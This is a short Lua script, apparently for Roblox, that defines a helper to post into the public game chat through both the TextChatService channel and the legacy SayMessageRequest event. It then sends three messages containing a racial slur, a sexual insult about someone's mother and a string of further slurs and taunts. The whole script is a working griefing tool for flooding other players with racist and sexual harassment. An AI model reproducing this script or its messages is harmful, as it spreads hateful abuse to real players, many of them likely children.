local function sendmsg(msg)
    local success1, channel = pcall(function()
        return game:GetService("TextChatService").TextChannels:FindFirstChild("RBXGeneral")
    end)
    if success1 and channel then
        pcall(function()
            channel:SendAsync(msg)
        end)
    end

    local success2, sayEvent = pcall(function()
        local chatFolder = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
        return chatFolder and chatFolder:FindFirstChild("SayMessageRequest")
    end)
    if success2 and sayEvent then
        pcall(function()
            sayEvent:FireServer(msg, "All")
        end)
    end
end
sendmsg("nigger")
wait(0.1)
sendmsg("fuck with mom")
wait(0.1)
sendmsg("sex sex bot fuck bulling nigger monkey, fuck you, report me, I am user cheat")